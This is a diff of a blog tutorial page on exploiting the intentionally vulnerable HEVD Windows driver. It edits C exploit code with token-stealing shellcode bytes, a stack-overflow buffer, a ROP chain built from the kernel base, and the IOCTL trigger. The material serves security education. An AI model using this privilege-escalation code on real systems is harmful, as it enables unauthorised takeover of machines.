@@ -533,10 +533,9 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>INT <span style="color:#a6e22e">TriggerExploit</span>(HANDLE hDevice);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>INT <span style="color:#a6e22e">main</span>() {
-</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>INT <span style="color:#a6e22e">main</span>() 
+</span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>    HANDLE hDevice;
-</span></span><span style="display:flex;"><span>    INT result;
 </span></span><span style="display:flex;"><span>    PCWSTR lpDeviceName <span style="color:#f92672">=</span> <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">HackSysExtremeVulnerableDriver&#34;</span>;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    hDevice <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateFileW</span>(
@@ -555,10 +554,10 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Device opened successfully!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> <span style="color:#a6e22e">TriggerExploit</span>(hDevice);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (result <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">TriggerExploit</span>(hDevice) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Exploit completed successfully!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
 </span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Exploit failed: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Cleaning up and closing handle...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
@@ -567,23 +566,19 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>INT <span style="color:#a6e22e">TriggerExploit</span>(HANDLE hDevice) {
-</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>INT <span style="color:#a6e22e">TriggerExploit</span>(HANDLE hDevice) 
+</span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>    UINT64 <span style="color:#f92672">*</span>lpInBuffer;
 </span></span><span style="display:flex;"><span>    LPVOID  lpShellcode;
 </span></span><span style="display:flex;"><span>    SIZE_T  inBufferSize;
 </span></span><span style="display:flex;"><span>    DWORD   bytesReturned;
 </span></span><span style="display:flex;"><span>    SIZE_T  shellcodeSize <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(TokenStealingPayloadWin8);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Allocate space for the shellcode
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Allocating executable memory for shellcode</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    lpShellcode <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualAlloc</span>(NULL, 
-</span></span><span style="display:flex;"><span>                               shellcodeSize,
-</span></span><span style="display:flex;"><span>                               MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE,
-</span></span><span style="display:flex;"><span>                               PAGE_EXECUTE_READWRITE);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>lpShellcode) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(lpShellcode <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualAlloc</span>(NULL, shellcodeSize, MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE, PAGE_EXECUTE_READWRITE))) {
 </span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to allocate memory for shellcode: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
 </span></span><span style="display:flex;"><span>    }
@@ -595,27 +590,26 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Allocate a buffer of the correct size for the overflow.  Need to overflow 
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// the buffer, three callee saved registers, and the return address.
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    inBufferSize <span style="color:#f92672">=</span> BUFFER_SIZE <span style="color:#f92672">+</span> (<span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> POINTER_SIZE) <span style="color:#f92672">+</span> POINTER_SIZE;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// the buffer, three callee saved registers, and enough space for the ROP chain.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    inBufferSize <span style="color:#f92672">=</span> BUFFER_SIZE <span style="color:#f92672">+</span> (<span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> POINTER_SIZE) <span style="color:#f92672">+</span> CHAIN_SIZE;
 </span></span><span style="display:flex;"><span>    
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Alocate the user buffer to be sent to the driver
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    lpInBuffer <span style="color:#f92672">=</span> <span style="color:#a6e22e">HeapAlloc</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), HEAP_ZERO_MEMORY, inBufferSize);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>lpInBuffer) {
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(lpInBuffer <span style="color:#f92672">=</span> <span style="color:#a6e22e">HeapAlloc</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), HEAP_ZERO_MEMORY, inBufferSize))) {
 </span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to allocate memory for buffer: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
 </span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>    
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Created buffer of size: %zu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, inBufferSize);
 </span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Set buffer to be full of &#39;A&#39;s
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">RtlFillMemory</span>(lpInBuffer, inBufferSize, <span style="color:#e6db74">&#39;A&#39;</span>);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Set last bytes of buffer to point to the shellcode.
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    lpInBuffer[(inBufferSize <span style="color:#f92672">/</span> POINTER_SIZE) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> (UINT64)lpShellcode;
 </span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Sending buffer with IOCTL: 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, HEVD_IOCTL_BUFFER_OVERFLOW);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    
 </span></span><span style="display:flex;"><span>    BOOL result <span style="color:#f92672">=</span> <span style="color:#a6e22e">DeviceIoControl</span>(
 </span></span><span style="display:flex;"><span>        hDevice,
 </span></span><span style="display:flex;"><span>        HEVD_IOCTL_BUFFER_OVERFLOW,
@@ -630,7 +624,6 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 </span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to send IOCTL to HEVD Driver: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
 </span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] IOCTL sent successfully to HEVD driver!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Freeing input buffer...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
@@ -755,7 +748,8 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define CHAIN_SIZE 4 * POINTER_SIZE  
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>CHAR TokenStealingPayloadWin8[] <span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// https://github.com/stolenfootball/HEVDExploits/blob/main/BufferOverflowStack/Windows8x64/shellcode.asm
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>CHAR TokenStealingPayloadWin8[] <span style="color:#f92672">=</span>
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x53</span>, <span style="color:#ae81ff">0x51</span>, <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x25</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>,
 </span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0xB8</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0xC3</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8B</span>,
@@ -766,7 +760,6 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 </span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0xEE</span>, <span style="color:#ae81ff">0x49</span>, <span style="color:#ae81ff">0x81</span>, <span style="color:#ae81ff">0xC6</span>, <span style="color:#ae81ff">0xD0</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x4D</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0xF7</span>,
 </span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x4D</span>, <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x7F</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x83</span>, <span style="color:#ae81ff">0xC4</span>, <span style="color:#ae81ff">0x10</span>, <span style="color:#ae81ff">0x59</span>, <span style="color:#ae81ff">0x5B</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0xC3</span>
 </span></span><span style="display:flex;"><span>};
-</span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>INT <span style="color:#a6e22e">TriggerExploit</span>(HANDLE hDevice);
@@ -793,9 +786,10 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Device opened successfully!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">TriggerExploit</span>(hDevice)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">TriggerExploit</span>(hDevice) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Exploit completed successfully!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
 </span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Exploit failed: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Cleaning up and closing handle...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
@@ -844,7 +838,17 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Set buffer to be full of &#39;A&#39;s
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">RtlFillMemory</span>(lpInBuffer, inBufferSize, <span style="color:#e6db74">&#39;A&#39;</span>);
 </span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Create the ROP Chain
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(kernelBase <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetKernelBaseAddress</span>())) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to calculate kernel base</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Return address is at the buffer size plus the size of the three callee saved registers to 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// overwrite plus the size of the return address.  Since the array is of size UINT64, we need
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// to divide by 8 to get the correct index into the array from the raw size in bytes, then 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// subtract one to account for zero indexing.
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    returnAddrIndex <span style="color:#f92672">=</span> ((BUFFER_SIZE <span style="color:#f92672">+</span> (<span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> POINTER_SIZE) <span style="color:#f92672">+</span> POINTER_SIZE) <span style="color:#f92672">/</span> POINTER_SIZE) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    lpInBuffer[returnAddrIndex<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> POP_RCX <span style="color:#f92672">+</span> kernelBase;
@@ -854,7 +858,7 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Sending buffer with IOCTL: 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, HEVD_IOCTL_BUFFER_OVERFLOW);
-</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>        
 </span></span><span style="display:flex;"><span>    BOOL result <span style="color:#f92672">=</span> <span style="color:#a6e22e">DeviceIoControl</span>(
 </span></span><span style="display:flex;"><span>        hDevice,
 </span></span><span style="display:flex;"><span>        HEVD_IOCTL_BUFFER_OVERFLOW,
@@ -1060,6 +1064,9 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 </span></span><span style="display:flex;"><span>    HANDLE hDevice;
 </span></span><span style="display:flex;"><span>    PCWSTR lpDeviceName <span style="color:#f92672">=</span> <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">HackSysExtremeVulnerableDriver&#34;</span>;
 </span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Author: @stolenfootball</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Website: https://stolenfootball.github.io</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    hDevice <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateFileW</span>(
 </span></span><span style="display:flex;"><span>        lpDeviceName,
 </span></span><span style="display:flex;"><span>        GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE,
@@ -1205,7 +1212,8 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> (UINT64)pKernelBaseAddress;
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><h2 id="final-thoughts">Final thoughts</h2>
+</span></span></code></pre></div><p>As always, this can also be found on <a href="https://github.com/stolenfootball/HEVDExploits/blob/main/BufferOverflowStack/Windows8x64/exploit.c" target="_blank">Github</a>.</p>
+<h2 id="final-thoughts">Final thoughts</h2>
 <p>That was a long post, but hopefully some people stuck with me for it.  The next post will be about bypassing VBS, the newest mitigation for local kernel exploitation.  Once you can do that, you can start writing exploits for brand new Windows 11 systems.</p>
 <p>I&rsquo;m starting a new job soon so I&rsquo;m not sure when I&rsquo;m going to have a chance to post next.  I highly recommend reading through some of the writeups linked on the <a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver" target="_blank">HEVD Github</a> if you want to continue in the meantime.</p>
 <p>Thanks for sticking with me so far, hope to see you again in the future!</p>
